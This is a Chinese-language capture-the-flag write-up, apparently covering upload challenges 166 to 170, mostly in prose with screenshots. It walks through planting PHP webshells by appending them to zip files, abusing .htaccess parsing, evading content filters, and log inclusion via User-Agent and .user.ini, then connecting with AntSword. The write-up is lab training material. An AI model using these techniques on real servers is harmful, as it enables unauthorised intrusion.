<p>第一个坑之所以需要是因为查看jpg图片的返回包，我们可以很清晰的发现存在二次渲染的痕迹，即<code>ATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality</code></p> 
<blockquote> 
 <p>解决方案：</p> 
 <p>思考下我们抓包的内容是什么，是图片的信息，所以我们也可以直接下载图片然后txt打开就可以看到二次渲染的痕迹啦</p> 
</blockquote> 
<p>关于第二个 目前也没有解决 感觉需要审一下代码</p> 
<p>但是和A师傅要了一个武器库</p> 
<p>上传后直接连 不用考虑二次渲染问题，都处理好了</p> 
<p><img src="https://images2.imgbox.com/52/98/mkflhwa9_o.png" alt="image-20240601104452261"></p> 
<h4><a id="web166_689"></a>web166</h4> 
<h5><a id="zip_691"></a>考点：zip文件包含</h5> 
<p>开题CtrlU看一下</p> 
<p><img src="https://images2.imgbox.com/c0/c5/bGIo8Rxw_o.png" alt="image-20240602171443961"></p> 
<p>发现只能上传zip文件</p> 
<p>想在压缩包后面写个一句话，直接在右侧栏中写就好</p> 
<p><img src="https://images2.imgbox.com/b5/20/1sRRD0dL_o.png" alt="image-20240602171330518"></p> 
<p><img src="https://images2.imgbox.com/47/13/C9JwUb9Y_o.png" alt="image-20240602171739039"></p> 
<p>成功上传后，找到这个下载文件的链接展开利用</p> 
<p><img src="https://images2.imgbox.com/f8/69/rYrZ9dZH_o.png" alt="image-20240602171808558"></p> 
<p>直接连蚁剑，拿下：</p> 
<p><img src="https://images2.imgbox.com/ae/c4/AORAQjHM_o.png" alt="image-20240602172040705"></p> 
<h4><a id="Web167_717"></a>Web167</h4> 
<h5><a id="htaccess_719"></a>考点：.htaccess解析</h5> 
<p><img src="https://images2.imgbox.com/7d/dc/Bjdf3u2u_o.png" alt="image-20240602172252215"></p> 
<p>只收jpg</p> 
<p><img src="https://images2.imgbox.com/05/d8/kiPmWk41_o.png" alt="image-20240602172424122"></p> 
<p>下载后可以发现木马仍然存在，所以是单纯的没有解析</p> 
<p><img src="https://images2.imgbox.com/1a/e0/M8nfTn6k_o.png" alt="image-20240602172626678"></p> 
<p>考虑尝试下htaccess进行解析</p> 
<p><img src="https://images2.imgbox.com/9e/9f/hetiWb3n_o.png" alt="image-20240602173038358"></p> 
<p>上传成功</p> 
<p>在访问一下图片就能触发解析了</p> 
<p><img src="https://images2.imgbox.com/ae/a2/eewOn96c_o.png" alt="image-20240602173118778"></p> 
<p>直接连蚁剑，拿下</p> 
<p><img src="https://images2.imgbox.com/1c/af/CZqlXzGp_o.png" alt="image-20240602173549060"></p> 
<p>现在一回顾可以发现其实题面也给出了提示</p> 
<p><img src="https://images2.imgbox.com/6e/47/xH9Ix63P_o.png" alt="image-20240602173710354"></p> 
<p>httpd</p> 
<h4><a id="web168_753"></a>web168</h4> 
<h5><a id="_755"></a>考点：基础免杀</h5> 
<p><img src="https://images2.imgbox.com/07/36/lepto2qs_o.png" alt="image-20240602173834732"></p> 
<p>接收png，先上武器库图片</p> 
<p>发现带木马的图片直接传不了</p> 
<p>正常的可以传，如下</p> 
<p><img src="https://images2.imgbox.com/99/db/7r0vMKVU_o.png" alt="image-20240602174901257"></p> 
<p>我们通过这个正常上传的文件抓到上传包</p> 
<p><img src="https://images2.imgbox.com/d4/53/YnEAnJwL_o.png" alt="image-20240602175205052"></p> 
<p>发现改php后缀可以上传成功</p> 
<p><img src="https://images2.imgbox.com/85/ad/1t9wyGno_o.png" alt="image-20240602175244360"></p> 
<p>猜测一下位置，发现也可以解析成功</p> 
<p><img src="https://images2.imgbox.com/90/ca/3LO82Tnp_o.png" alt="image-20240602175347673"></p> 
<p>上传发现有内容检测，ban了一些东西，既然命令无法执行ls，那么使用var_dump遍历查询目录</p> 
<p><img src="https://images2.imgbox.com/18/7d/LtWT7gYj_o.png" alt="image-20240602175527551"></p> 
<p>其中…表示上级目录</p> 
<p><img src="https://images2.imgbox.com/d6/5d/Xf5IdF5G_o.png" alt="image-20240602175549466"></p> 
<p>想一下怎么读</p> 
<p><img src="https://images2.imgbox.com/a3/55/dQS6u0QA_o.png" alt="image-20240602175633047"></p> 
<p>先试一下include<img src="https://images2.imgbox.com/d8/ad/kq6vE3Qr_o.png" alt="image-20240602175706094"></p> 
<p>被ban</p> 
<p>再试show_source</p> 
<p><img src="https://images2.imgbox.com/1c/31/hrOvziw3_o.png" alt="image-20240602175746681"></p> 
<p>成功 但是flag在flagaa.php</p> 
<blockquote> 
 <p>总结一下：</p> 
 <p>基础免杀的含义无非就是需要绕过几个函数罢了</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/e5/97/RORwqFcR_o.png" alt="image-20240602175934209"></p> 
<p>这是什么呢，存一下</p> 
<h4><a id="Web169170_811"></a>Web169、170</h4> 
<h5><a id="__813"></a>考点：高级免杀 包含日志</h5> 
<p><img src="https://images2.imgbox.com/7d/10/wtYomHt7_o.png" alt="image-20240602180953266"></p> 
<p>开题发现只能传zip</p> 
<p>那么通过上传正常的zip文件进行抓包，然后进行利用</p> 
<p>注意如果zip文件有马，无法上传</p> 
<p><img src="https://images2.imgbox.com/a7/e1/LLEa5glM_o.png" alt="image-20240602181135877"></p> 
<p><img src="https://images2.imgbox.com/fe/a4/gnFN7XWt_o.png" alt="image-20240602181337336"></p> 
<p>不知道为什么还是不行，但是抓到包了就足够了</p> 
<p><code>Content-Type: application/x-zip-compressed</code></p> 
<p>当这个类型是zip的时候始终无法上传</p> 
<p>修改为png</p> 
<p><img src="https://images2.imgbox.com/da/5f/mf3mpaIv_o.png" alt="image-20240602181821966"></p> 
<p>直接成功</p> 
<p><img src="https://images2.imgbox.com/8b/d8/JxrdP4fS_o.png" alt="image-20240602181834885"></p> 
<p>而且可以发现对后缀也没有任何检测</p> 
<p><img src="https://images2.imgbox.com/9e/f0/EmadIkKY_o.png" alt="image-20240602181919083"></p> 
<p>e 被ban了</p> 
<p>所以要做高级免杀，想到日志包含</p> 
<blockquote> 
 <p>思路：</p> 
 <p>把木马写在User-Agent中</p> 
 <p>然后通过user.ini的设置 把指定的php文件自动加载也就是access.log</p> 
</blockquote> 
<p>设置user.ini</p> 
<p><img src="https://images2.imgbox.com/67/74/8ZLQW7MP_o.png" alt="image-20240602182225547"></p> 
<p>写木马到access.log</p> 
<p><img src="https://images2.imgbox.com/e5/ef/evWYj0lX_o.png" alt="image-20240602182343897"></p> 
<p>上传一个php文件触发</p> 
<p><img src="https://images2.imgbox.com/07/3c/JHDSSbqZ_o.png" alt="image-20240602182412701"></p> 
<p>访问一下1.php触发</p> 
<p><img src="https://images2.imgbox.com/c1/1a/TSPotAgS_o.png" alt="image-20240602182520885"></p> 
<p>加载成功</p> 
<p>直接蚁剑链接 密码是1</p> 
<p><img src="https://images2.imgbox.com/c4/c6/jkGjrhZS_o.png" alt="image-20240602182616919"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/e12ae8a509a43c6c2d94a54428b774c0/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">基于密度的聚类算法DBSCAN详解！</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/d45bf1670c2f6dd60bf1285a92cdde7f/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">基于 Amazon EC2 快速部署 Stable Diffusion WebUI &#43; chilloutmax 模型</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>